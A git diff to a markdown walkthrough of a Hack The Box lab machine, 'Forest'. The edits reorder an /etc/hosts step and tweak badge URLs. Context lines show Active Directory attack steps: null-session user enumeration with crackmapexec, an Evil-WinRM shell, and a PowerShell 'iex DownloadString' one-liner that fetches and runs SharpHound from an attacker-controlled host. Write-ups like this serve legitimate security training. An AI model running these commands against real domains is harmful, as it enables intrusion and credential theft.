@@ -28,7 +28,6 @@
 - PowerView (PowerSploit)
 - PsExec
 - SharpHound
-- smbclient
 
 #### Machine Writeup
 
@@ -92,11 +91,6 @@ Nmap done: 1 IP address (1 host up) scanned in 819.89 seconds
 `crackmapexec smb 10.10.10.161`:
 ```
 SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) ←
-```
-
-`echo -e '10.10.10.161\tFOREST.htb.local\tFOREST\thtb.local' | tee -a /etc/hosts`:
-```
-10.10.10.161    FOREST.htb.local    FOREST    htb.local ←
 ```
 
 <❌ Failed Step>
@@ -215,6 +209,11 @@ PORT    STATE SERVICE
 Service Info: Host: FOREST; OS: Windows
 
 Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
+```
+
+`echo -e '10.10.10.161\tFOREST.htb.local\tFOREST\thtb.local' | tee -a /etc/hosts`:
+```
+10.10.10.161    FOREST.htb.local    FOREST    htb.local ←
 ```
 
 `crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users | tee ./out.txt`:
@@ -405,7 +404,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
 ```
 
-![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc-alfresco-64b5f6?logo=windows11&logoColor=white)
+![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
@@ -499,7 +498,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] Config file parsed
 ```
 
-![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc-alfresco-64b5f6?logo=windows11&logoColor=white)
+![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)
 
 `cd ../appdata/local/temp`
 
@@ -524,7 +523,7 @@ function Invoke-BloodHound
         PS C:\> Invoke-BloodHound -CollectionMethods DCOnly -NoSaveCache -RandomizeFilenames -EncryptZip
 ```
 
-![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc-alfresco-64b5f6?logo=windows11&logoColor=white)
+![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)
 
 `powershell.exe -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.7/sh.ps1'); Invoke-BloodHound -CollectionMethods All -Domain 'htb.local' -OutputDirectory ./"`:
 ```
@@ -683,7 +682,7 @@ Source: [https://github.com/n00py/DCSync](https://github.com/n00py/DCSync)
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc-alfresco-64b5f6?logo=windows11&logoColor=white)
+![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)
 
 `net user`:
 ```
